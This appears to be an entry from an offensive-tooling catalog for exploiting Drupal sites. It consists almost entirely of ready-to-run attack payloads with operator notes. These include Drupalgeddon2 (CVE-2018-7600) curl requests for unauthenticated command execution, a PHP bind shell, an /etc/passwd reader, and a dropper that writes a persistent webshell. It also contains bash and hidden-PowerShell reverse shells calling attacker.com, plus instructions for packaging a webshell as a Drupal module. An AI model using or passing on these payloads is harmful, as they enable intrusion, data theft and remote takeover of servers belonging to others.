---
comment: "Drupal is a PHP-based CMS. Three independent exploitation paths exist:\n\
  \n1. CVE-2018-7600 (Drupalgeddon2) \u2014 unauthenticated RCE via the Form API AJAX\
  \ handler.\n   The #post_render callback is not sanitised, allowing arbitrary PHP\
  \ function calls.\n   Affects Drupal < 7.58 and Drupal 8.x < 8.3.9 / < 8.4.6 / <\
  \ 8.5.1. Listed in the\n   CISA KEV catalog; widely exploited in the wild.\n\n2.\
  \ PHP filter module (Drupal 7.x core only) \u2014 admin users can embed and execute\
  \ PHP\n   directly inside page/article content via the built-in \"PHP code\" text\
  \ format.\n   The module was removed from Drupal 8 core but may be installed as\
  \ a contrib module.\n\n3. Custom module upload \u2014 any admin user with \"administer\
  \ modules\" permission can install\n   a ZIP archive containing arbitrary PHP files,\
  \ which are then served directly by the\n   web server from the modules directory.\n"
functions:
  bind-shell:
  - code: |
      <?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("/bin/sh",array(0=>$c,1=>$c,2=>$c),$x); ?>
    comment: |
      Package as a module PHP file (see webshell entry for packaging instructions) and
      trigger via an HTTP request to the module file. The page hangs while the bind shell
      awaits a connection on port 12345. Requires the PHP sockets extension.
    connector: tcp-client
    contexts:
      admin:
    tty: false
  file-read:
  - code: |
      <?php echo file_get_contents('/etc/passwd'); ?>
    comment: |
      Inject into a Drupal 7 PHP filter page body or into a module PHP file. The file
      content is returned inline in the HTTP response when the node/page is requested.
    contexts:
      admin:
  file-write:
  - code: |
      <?php file_put_contents('/var/www/html/drupal/shell.php','<?php system($_GET["c"]); ?>'); ?>
    comment: |
      Inject into a PHP filter page or module file. Writes a secondary webshell to the
      Drupal webroot for persistent access. Adjust the path to match the target's document
      root (commonly /var/www/html, /var/www/drupal, or /srv/www).
    contexts:
      admin:
  rce:
  - code: "# Drupal 8.x \u2014 AJAX user registration handler\ncurl -s \\\n  'http://victim.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'\
      \ \\\n  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id'\n"
    comment: |
      CVE-2018-7600 (Drupalgeddon2): the Form API AJAX handler passes #post_render
      callbacks to call_user_func_array() without validation, executing any PHP callable.
      Using passthru() with the command in #markup prints the full output directly.
      Command output appears inline in the JSON response body's `data` array.
      Ref: https://www.exploit-db.com/exploits/44448
    contexts:
      unauthenticated:
    version: |-
      8.x < 8.5.1 / < 8.4.6 / < 8.3.9
  - code: "# Drupal 7.x \u2014 password reset form variant\ncurl -s \\\n  'http://victim.com/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id'\
      \ \\\n  --data 'form_id=user_pass&_triggering_element_name=name'\n"
    comment: |
      CVE-2018-7600 (Drupalgeddon2): Drupal 7.x variant targeting the password reset form.
      The name[] parameter is processed by the same unsanitised Form API path.
      Command output appears in the JSON response body's `data` array.
      Ref: https://www.exploit-db.com/exploits/44449
    contexts:
      unauthenticated:
    version: |-
      7.x < 7.58
  - code: |
      <?php if(isset($_GET['cmd'])){ passthru($_GET['cmd']); } ?>
    comment: |
      Enable the PHP filter module at /admin/modules (Drupal 7 core). Navigate to
      /node/add/page, paste this snippet in the body, set the Text format dropdown to
      "PHP code", and save. Trigger at the node URL with ?cmd=id appended.
      In Drupal 8+, install the contrib php module first if available.
    contexts:
      admin:
    version: |-
      7.x
  reverse-shell:
  - blind: true
    code: |
      curl -s \
        'http://victim.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
        --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=bash+-c+"bash+-i+>%26+/dev/tcp/attacker.com/12345+0>%261"'
    comment: "CVE-2018-7600: spawns a reverse bash shell via the Drupal 8 AJAX handler.\
      \ Uses\nexec() (no output returned) so the HTTP response will not confirm execution.\n\
      Check the listener \u2014 the connection arrives within seconds of the request.\n"
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |-
      8.x < 8.5.1 / < 8.4.6 / < 8.3.9
  - blind: true
    code: |
      <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &"); ?>
    comment: |
      Inject into a Drupal 7 PHP filter page or into a module PHP file (see webshell
      entry for packaging instructions). Trigger by visiting the node/page. The reverse
      shell runs asynchronously in the background.
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: |
      <?php $s=new COM('WScript.Shell');$s->exec('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\"attacker.com\",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"'); ?>
    comment: |
      Windows variant: inject into a Drupal PHP filter page or module file. Uses
      WScript.Shell COM object to launch a hidden PowerShell reverse shell.
      Requires PHP's COM extension (enabled by default on Windows PHP builds).
    contexts:
      admin:
    listener: tcp-server
    platform: windows
    tty: false
  webshell:
  - code: |
      <?php if(isset($_REQUEST['c'])){echo "<pre>",shell_exec($_REQUEST['c']),"</pre>";}?>
    comment: "Package this file as a minimal Drupal module and install at /admin/modules/install.\n\
      Required directory structure (zip -r shell.zip shell/):\n\n  shell/shell.php\
      \         \u2190 this file\n  shell/shell.info.yml    \u2190 module metadata:\n\
      \    name: 'Shell'\n    type: module\n    core_version_requirement: '^8 || ^9\
      \ || ^10 || ^11'\n\nAfter installing and enabling the module, access at:\nhttp://victim.com/modules/custom/shell/shell.php?c=id\n\
      \nDrupal's .htaccess does not block direct PHP execution under the modules path.\n"
    contexts:
      admin:
...
